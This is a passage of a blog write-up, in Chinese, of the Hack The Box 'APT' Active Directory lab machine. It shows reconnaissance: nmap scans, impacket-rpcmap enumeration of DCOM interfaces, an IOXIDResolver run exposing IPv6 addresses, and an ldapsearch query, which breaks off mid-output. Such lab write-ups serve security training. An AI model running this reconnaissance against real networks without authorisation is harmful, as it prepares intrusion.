rel="tag">smbmap</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/splunk/" rel="tag">splunk</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/spn/" rel="tag">spn</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/sqlcmd/" rel="tag">sqlcmd</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/sqli/" rel="tag">sqli</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/sssd/" rel="tag">sssd</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ssti/" rel="tag">ssti</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/study/" rel="tag">study</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/svn/" rel="tag">svn</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/symlink/" rel="tag">symlink</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/sysctl/" rel="tag">sysctl</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/teampass/" rel="tag">teampass</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/tgt/" rel="tag">tgt</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/username-anarchy/" rel="tag">username-anarchy</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/wapt/" rel="tag">wapt</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/websocket/" rel="tag">websocket</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/winlogon/" rel="tag">winlogon</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ysoserial-net/" rel="tag">ysoserial.net</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/zip/" rel="tag">zip</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/%E5%AE%9E%E4%BE%8B%E8%AE%B0%E5%BD%95/" rel="tag">实例记录</a></li></ul>
    </div>
  </div>


  
  <div class="sticky">
    
      


  <div class="widget-wrap">
    <div class="widget">
      <h3 class="widget-title">Categories</h3>
      <div class="category-box">
            <a class="category-link" href="/categories/forensic/">
                forensic
                <div class="category-count">3</div>
            </a>
        
            <a class="category-link" href="/categories/cloud/">
                cloud
                <div class="category-count">9</div>
            </a>
        
            <a class="category-link" href="/categories/AD/">
                AD
                <div class="category-count">12</div>
            </a>
        
            <a class="category-link" href="/categories/htb-Season-5/">
                htb-Season-5
                <div class="category-count">7</div>
            </a>
        
            <a class="category-link" href="/categories/htb-Season-6/">
                htb-Season-6
                <div class="category-count">10</div>
            </a>
        
            <a class="category-link" href="/categories/htb-Season-4/">
                htb-Season-4
                <div class="category-count">3</div>
            </a>
        
            <a class="category-link" href="/categories/htb-Season-7/">
                htb-Season-7
                <div class="category-count">9</div>
            </a>
        
            <a class="category-link" href="/categories/CVE/">
                CVE
                <div class="category-count">1</div>
            </a>
        
            <a class="category-link" href="/categories/ctf/">
                ctf
                <div class="category-count">8</div>
            </a>
        
            <a class="category-link" href="/categories/Sherlocks/">
                Sherlocks
                <div class="category-count">1</div>
            </a>
        
            <a class="category-link" href="/categories/htb-Season-8/">
                htb-Season-8
                <div class="category-count">1</div>
            </a>
        </div>
    </div>
  </div>


    
      
  <div class="widget-wrap">
    <div class="widget">
      <h3 class="widget-title">Recent Posts</h3>
      <ul>
        
          <a class="recent-link" href="/2025/06/09/box-wp-TombWatcher/" title="【season-8】 htb TombWatcher wp" >
            <div class="recent-link-text">
              【season-8】 htb TombWatcher wp
            </div>
          </a>
        
          <a class="recent-link" href="/2025/06/06/Tracks-cloud-Vessel/" title="Tracks-cloud-Vessel" >
            <div class="recent-link-text">
              Tracks-cloud-Vessel
            </div>
          </a>
        
          <a class="recent-link" href="/2025/06/04/Tracks-AD-APT/" title="Tracks-AD-APT" >
            <div class="recent-link-text">
              Tracks-AD-APT
            </div>
          </a>
        
          <a class="recent-link" href="/2025/05/21/crtp-lab-note/" title="crtp-study-lab-note" >
            <div class="recent-link-text">
              crtp-study-lab-note
            </div>
          </a>
        
          <a class="recent-link" href="/2025/04/22/box-wp-Scepter/" title="【season-7】 htb Scepter wp" >
            <div class="recent-link-text">
              【season-7】 htb Scepter wp
            </div>
          </a>
        
      </ul>
    </div>
  </div>

    
  </div> 
</sidebar>


    </div>
    
    <div id="toc" class="widget-wrap">
      <button class="toc-toggle" onclick="toggleTOC()">
    <span class="toc-toggle-icon">
        <i class="fa fa-angle-down" aria-hidden="true" style="border-radius: 50%; padding: 5px; border: 1px solid var(--link);"></i>
    </span>
</button>
<div id="tocContainer" style="display: block;">
    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Nmap"><span class="toc-number">1.</span> <span class="toc-text">Nmap</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#User"><span class="toc-number"></span> <span class="toc-text">User</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#80-http"><span class="toc-number">1.</span> <span class="toc-text">80&#x2F;http</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#135-tcp"><span class="toc-number">2.</span> <span class="toc-text">135&#x2F;tcp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ldap"><span class="toc-number">3.</span> <span class="toc-text">ldap</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8C%BF%E5%90%8D%E8%AE%BF%E9%97%AEsmb"><span class="toc-number">4.</span> <span class="toc-text">匿名访问smb</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%8F%AF%E7%94%A8%E8%B4%A6%E6%88%B7"><span class="toc-number">5.</span> <span class="toc-text">获取可用账户</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%92%9E-henry-vinson-%E8%B4%A6%E6%88%B7%E5%8F%AF%E7%94%A8-hash"><span class="toc-number">5.1.</span> <span class="toc-text">撞 henry.vinson 账户可用 hash</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E8%AF%BB%E5%8F%96%E6%B3%A8%E5%86%8C%E8%A1%A8%E8%8E%B7%E5%8F%96-henry-vinson-adm-%E5%87%AD%E8%AF%81"><span class="toc-number">6.</span> <span class="toc-text">远程读取注册表获取 henry.vinson_adm 凭证</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GetUser"><span class="toc-number">7.</span> <span class="toc-text">GetUser</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Root"><span class="toc-number"></span> <span class="toc-text">Root</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#root-route2-PetitPotam"><span class="toc-number"></span> <span class="toc-text">root route2 - PetitPotam</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#getroot"><span class="toc-number">1.</span> <span class="toc-text">getroot</span></a></li></ol>
</div>
<script>
    function toggleTOC() {
        const tocContainer = document.getElementById('tocContainer');
        tocContainer.style.display = tocContainer.style.display === 'none' ? 'block' : 'none';
        const toggleIcon = document.querySelector('.toc-toggle-icon i');
        toggleIcon.classList.toggle('fa-angle-down');
        toggleIcon.classList.toggle('fa-angle-up');
    }
</script>
<style>
    .toc-toggle {
        position: relative;
        display: inline-block;
        padding: 2% 2% 2%;
        border: none;
        border-radius: 100%;
        background-color: var(--link);
        cursor: pointer;
        transition: all 0.1s ease;
        box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
        /* position: absolute; */
        top: 0;
        right: 0;
        z-index: 10;
    }

    .toc-toggle:hover {
        background-color: var(--selection-bg);
        transform: scale(1.1);
    }

    .toc-toggle-icon {
        display: inline-block;
        vertical-align: middle;
    }

    .toc-toggle-icon i {
        display: inline-block;
        border-radius: 50%; /* Ensures the icon itself is a perfect circle */
    }

    /* #tocContainer {
        display: block;
        margin-top: 10px;
    } */
    #tocContainer {
    position: relative;
    padding-top: 10px; /* 留出按钮位置 */
}
</style>


    </div>
    
    <div id="content-body">
       


<article id="post-Tracks-AD-APT" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
    
<div class="article-gallery">
  <div class="article-gallery-photos">
    
      <a class="article-gallery-img" rel="gallery_cmbjpszqt000fq8ky77sg3c2m">
        <img src="/wpimages/2025/tracks-ad/APT/background.jpg" itemprop="image">
      </a>
    
  </div>
</div>

   
  <div class="article-inner">
    <div class="article-main">
      <header class="article-header">
        
<div class="main-title-bar">
  <div class="main-title-dot"></div>
  
    
      <h1 class="p-name article-title" itemprop="headline name">
        Tracks-AD-APT
      </h1>
    
  
</div>

        <div class='meta-info-bar'>
          <div class="meta-info">
  <time class="dt-published" datetime="2025-06-04T02:52:08.000Z" itemprop="datePublished">2025-06-04</time>
</div>
          <div class="need-seperator meta-info">
            <div class="meta-cate-flex">
  
  <a class="meta-cate-link" href="/categories/AD/">AD</a>
   
</div>
  
          </div>
          <div class="wordcount need-seperator meta-info">
            25k words 
          </div>
        </div>
        
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/AD/" rel="tag">AD</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Ntlmv1/" rel="tag">Ntlmv1</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Rogue-potato/" rel="tag">Rogue potato</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ipv6/" rel="tag">ipv6</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pth/" rel="tag">pth</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/reg/" rel="tag">reg</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/rpc/" rel="tag">rpc</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

      </header>
      <div class="e-content article-entry" itemprop="articleBody">
        
          <h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">└─$ sudo nmap -sS 10.10.10.213 -p- --min-rate=3000</span><br><span class="line"></span><br><span class="line">PORT    STATE SERVICE</span><br><span class="line">80/tcp  open  http</span><br><span class="line">135/tcp open  msrpc  </span><br></pre></td></tr></table></figure>

<h1 id="User"><a href="#User" class="headerlink" title="User"></a>User</h1><h2 id="80-http"><a href="#80-http" class="headerlink" title="80&#x2F;http"></a>80&#x2F;http</h2><p>80 web，内容如下</p>
<p><img src="/wpimages/2025/tracks-ad/APT/image-1.png" alt="alt text"></p>
<p>整个web没有存在价值的东西，support页面的contact部分在提交请求时会跳转到 <code>10.13.38.16</code>这个ip</p>
<p><img src="/wpimages/2025/tracks-ad/APT/image-2.png" alt="alt text"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://10.13.38.16/contact-post.html</span><br></pre></td></tr></table></figure>

<p>看源码这部分显示是个打包器的，这ip应该是打包时候的测试环境ip</p>
<p><img src="/wpimages/2025/tracks-ad/APT/image-3.png" alt="alt text"></p>
<h2 id="135-tcp"><a href="#135-tcp" class="headerlink" title="135&#x2F;tcp"></a>135&#x2F;tcp</h2><p>135端口是msrpc口子</p>
<p>这里用rpcmap解析下</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">└─$ impacket-rpcmap <span class="string">&#x27;ncacn_ip_tcp:10.10.10.213[135]&#x27;</span></span><br><span class="line">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies</span><br><span class="line"></span><br><span class="line">Procotol: N/A</span><br><span class="line">Provider: rpcss.dll</span><br><span class="line">UUID: 00000136-0000-0000-C000-000000000046 v0.0</span><br><span class="line"></span><br><span class="line">Protocol: [MS-DCOM]: Distributed Component Object Model (DCOM) Remote</span><br><span class="line">Provider: rpcss.dll</span><br><span class="line">UUID: 000001A0-0000-0000-C000-000000000046 v0.0</span><br><span class="line"></span><br><span class="line">Procotol: N/A</span><br><span class="line">Provider: rpcss.dll</span><br><span class="line">UUID: 0B0A6584-9E0F-11CF-A3CF-00805F68CB1B v1.1</span><br><span class="line"></span><br><span class="line">Procotol: N/A</span><br><span class="line">Provider: rpcss.dll</span><br><span class="line">UUID: 1D55B526-C137-46C5-AB79-638F2A68E869 v1.0</span><br><span class="line"></span><br><span class="line">Procotol: N/A</span><br><span class="line">Provider: rpcss.dll</span><br><span class="line">UUID: 412F241E-C12A-11CE-ABFF-0020AF6E7A17 v0.2</span><br><span class="line"></span><br><span class="line">Protocol: [MS-DCOM]: Distributed Component Object Model (DCOM) Remote</span><br><span class="line">Provider: rpcss.dll</span><br><span class="line">UUID: 4D9F4AB8-7D1C-11CF-861E-0020AF6E7C57 v0.0</span><br><span class="line"></span><br><span class="line">Procotol: N/A</span><br><span class="line">Provider: rpcss.dll</span><br><span class="line">UUID: 64FE0B7F-9EF5-4553-A7DB-9A1975777554 v1.0</span><br><span class="line"></span><br><span class="line">Protocol: [MS-DCOM]: Distributed Component Object Model (DCOM) Remote</span><br><span class="line">Provider: rpcss.dll</span><br><span class="line">UUID: 99FCFEC4-5260-101B-BBCB-00AA0021347A v0.0</span><br><span class="line"></span><br><span class="line">Protocol: [MS-RPCE]: Remote Management Interface</span><br><span class="line">Provider: rpcrt4.dll</span><br><span class="line">UUID: AFA8BD80-7D8A-11C9-BEF4-08002B102989 v1.0</span><br><span class="line"></span><br><span class="line">Procotol: N/A</span><br><span class="line">Provider: rpcss.dll</span><br><span class="line">UUID: B9E79E60-3D52-11CE-AAA1-00006901293F v0.2</span><br><span class="line"></span><br><span class="line">Procotol: N/A</span><br><span class="line">Provider: rpcss.dll</span><br><span class="line">UUID: C6F3EE72-CE7E-11D1-B71E-00C04FC3111A v1.0</span><br><span class="line"></span><br><span class="line">Procotol: N/A</span><br><span class="line">Provider: rpcss.dll</span><br><span class="line">UUID: E1AF8308-5D1F-11C9-91A4-08002B14A0FA v3.0</span><br><span class="line"></span><br><span class="line">Procotol: N/A</span><br><span class="line">Provider: rpcss.dll</span><br><span class="line">UUID: E60C73E6-88F9-11CF-9AF1-0020AF6E72F4 v2.0</span><br></pre></td></tr></table></figure>

<p>更详细的话用rpcdump解析了但是也详细不到哪去，这里就不搞了</p>
<p>其中有几个dcom点位暴露出来了</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Protocol: [MS-DCOM]: Distributed Component Object Model (DCOM) Remote</span><br><span class="line">Provider: rpcss.dll</span><br><span class="line">UUID: 000001A0-0000-0000-C000-000000000046 v0.0</span><br><span class="line"></span><br><span class="line">Protocol: [MS-DCOM]: Distributed Component Object Model (DCOM) Remote</span><br><span class="line">Provider: rpcss.dll</span><br><span class="line">UUID: 4D9F4AB8-7D1C-11CF-861E-0020AF6E7C57 v0.0</span><br><span class="line"></span><br><span class="line">Protocol: [MS-DCOM]: Distributed Component Object Model (DCOM) Remote</span><br><span class="line">Provider: rpcss.dll</span><br><span class="line">UUID: 99FCFEC4-5260-101B-BBCB-00AA0021347A v0.0</span><br></pre></td></tr></table></figure>

<p>可以查下对应关系</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/c25391af-f59e-40da-885e-cc84076673e4">https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/c25391af-f59e-40da-885e-cc84076673e4</a></p>
</blockquote>
<table>
<thead>
<tr>
<th></th>
<th></th>
<th></th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td>IID_IRemoteSCMActivator</td>
<td>{000001A0-0000-0000-C000-000000000046}</td>
<td>RPC interface UUID for IRemoteSCMActivator</td>
<td>3.1.2.5.2.2</td>
</tr>
<tr>
<td>IID_IActivation</td>
<td>{4d9f4ab8-7d1c-11cf-861e-0020af6e7c57}</td>
<td>RPC interface UUID for IActivation</td>
<td>3.1.2.5.2.1</td>
</tr>
<tr>
<td>IID_IObjectExporter</td>
<td>{99fcfec4-5260-101b-bbcb-00aa0021347a}</td>
<td>RPC interface UUID for IObjectExporter</td>
<td>3.1.2.5.1</td>
</tr>
</tbody></table>
<p>在挨个搜索到这里面的 <code>IID_IObjectExporter</code> 和它对应的uuid时找到了这两篇</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://googleprojectzero.blogspot.com/2021/10/windows-exploitation-tricks-relaying.html">https://googleprojectzero.blogspot.com/2021/10/windows-exploitation-tricks-relaying.html</a></p>
</blockquote>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://www.thehacker.recipes/ad/recon/ms-rpc">https://www.thehacker.recipes/ad/recon/ms-rpc</a></p>
</blockquote>
<p>project0这个讲提权的用不太到，重点关注下thehacker的这篇</p>
<p><img src="/wpimages/2025/tracks-ad/APT/image-4.png" alt="alt text"></p>
<p>这里说需要<code>IObjectExporter</code>调用他的 <code>ServerAlive2()</code> 方法，就可以获取计算机的网络接口说是。</p>
<p>所以需要看他这个方法注册了没</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/c898afd6-b75d-4641-a2cd-b50cb9f5556d">https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/c898afd6-b75d-4641-a2cd-b50cb9f5556d</a></p>
</blockquote>
<p>说是 <code>The ServerAlive2 (Opnum 5)</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">└─$ impacket-rpcmap <span class="string">&#x27;ncacn_ip_tcp:10.10.10.213[135]&#x27;</span> -opnum-max 5 -brute-opnums </span><br></pre></td></tr></table></figure>

<p><img src="/wpimages/2025/tracks-ad/APT/image-5.png" alt="alt text"></p>
<p><code>IObjectExporter</code> 的 <code>opnum5</code> 可以访问，也就这个说明能用</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">└─$ python3 IOXIDResolver.py -t 10.10.10.213       </span><br><span class="line">[*] Retrieving network interface of 10.10.10.213</span><br><span class="line">Address: apt</span><br><span class="line">Address: 10.10.10.213</span><br><span class="line">Address: dead:beef::50:f3c0:323b:e1a6</span><br><span class="line">Address: dead:beef::b885:d62a:d679:573f</span><br></pre></td></tr></table></figure>

<p>额外获取到俩ipv6</p>
<p>然后再一次nmap，这次能扫出东西了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">└─$ sudo nmap dead:beef::50:f3c0:323b:e1a6 -6 -sS -p- --min-rate=3000</span><br><span class="line">Nmap scan report for dead:beef::50:f3c0:323b:e1a6</span><br><span class="line">Host is up (0.10s latency).</span><br><span class="line">Not shown: 65512 filtered tcp ports (no-response)</span><br><span class="line">PORT      STATE SERVICE</span><br><span class="line">53/tcp    open  domain</span><br><span class="line">80/tcp    open  http</span><br><span class="line">88/tcp    open  kerberos-sec</span><br><span class="line">135/tcp   open  msrpc</span><br><span class="line">389/tcp   open  ldap</span><br><span class="line">445/tcp   open  microsoft-ds</span><br><span class="line">464/tcp   open  kpasswd5</span><br><span class="line">593/tcp   open  http-rpc-epmap</span><br><span class="line">636/tcp   open  ldapssl</span><br><span class="line">3268/tcp  open  globalcatLDAP</span><br><span class="line">3269/tcp  open  globalcatLDAPssl</span><br><span class="line">5985/tcp  open  wsman</span><br><span class="line">9389/tcp  open  adws</span><br><span class="line">47001/tcp open  winrm</span><br><span class="line">49664/tcp open  unknown</span><br><span class="line">49665/tcp open  unknown</span><br><span class="line">49666/tcp open  unknown</span><br><span class="line">49667/tcp open  unknown</span><br><span class="line">49669/tcp open  unknown</span><br><span class="line">49670/tcp open  unknown</span><br><span class="line">49673/tcp open  unknown</span><br><span class="line">49685/tcp open  unknown</span><br><span class="line">49706/tcp open  unknown</span><br></pre></td></tr></table></figure>

<h2 id="ldap"><a href="#ldap" class="headerlink" title="ldap"></a>ldap</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line">└─$ ldapsearch -x -H &#x27;ldap://[dead:beef::50:f3c0:323b:e1a6]&#x27;  -s base</span><br><span class="line"># extended LDIF</span><br><span class="line">#</span><br><span class="line"># LDAPv3</span><br><span class="line"># base &lt;&gt; (default) with scope baseObject</span><br><span class="line"># filter: (objectclass=*)</span><br><span class="line"># requesting: ALL</span><br><span class="line">#</span><br><span class="line"></span><br><span class="line">#</span><br><span class="line">dn:</span><br><span class="line">currentTime: 20250603083652.0Z</span><br><span class="line">subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=htb,DC=local</span><br><span class="line">dsServiceName: CN=NTDS Settings,CN=APT,CN=Servers,CN=Default-First-Site-Name,C</span><br><span class="line"> N=Sites,CN=Configuration,DC=htb,DC=local</span><br><span class="line">namingContexts: DC=htb,DC=local</span><br><span class="line">namingContexts: CN=Configuration,DC=htb,DC=local</span><br><span class="line">namingContexts: CN=Schema,CN=Configuration,DC=htb,DC=local</span><br><span class="line">namingContexts: DC=DomainDnsZones,DC=htb,DC=local</span><br><span class="line">namingContexts: DC=ForestDnsZones,DC=htb,DC=local</span><br><span class="line">defaultNamingContext: DC=htb,DC=local</span><br><span class="line">schemaNamingContext: CN=Schema,CN=Configuration,DC=htb,DC=local</span><br><span class="line">configurationNamingContext: CN=Configuration,DC=htb,DC=local</span><br><span class="line">rootDomainNamingContext: DC=htb,DC=local</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.319</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.801</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.473</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.528</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.417</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.619</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.841</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.529</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.805</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.521</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.970</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.1338</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.474</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.1339</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.1340</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.1413</span><br><span class="line">supportedControl: 2.16.840.1.113730.3.4.9</span><br><span class="line">supportedControl: 2.16.840.1.113730.3.4.10</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.1504</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.1852</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.802</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.1907</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.1948</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.1974</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.1341</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.2026</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.2064</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.2065</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.2066</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.2090</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.2205</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.2204</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.2206</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.2211</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.2239</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.2255</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.2256</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.2309</span><br><span class="line">supportedLDAPVersion: 3</span><br><span class="line">supportedLDAPVersion: 2</span><br><span class="line">supportedLDAPPolicies: MaxPoolThreads</span><br><span class="line">supportedLDAPPolicies: MaxPercentDirSyncRequests</span><br><span class="line">supportedLDAPPolicies: MaxDatagramRecv</span><br><span class="line">supportedLDAPPolicies: MaxReceiveBuffer</span><br><span class="line">supportedLDAPPolicies: InitRecvTimeout</span><br><span class="line">supportedLDAPPolicies: MaxConnections</span><br><span class="line">supportedLDAPPolicies: MaxConnIdleTime</span><br><span class="line">supportedLDAPPolicies: MaxPageSize</span><br><span class="line">supportedLDAPPolicies: MaxBatchReturnMessages</span><br><span class="line">supportedLDAPPolicies: MaxQueryDuration</span><br><span class="line">supportedLDAPPolicies: MaxDirSyncDuration</span><br><span class="line">supportedLDAPPolicies: 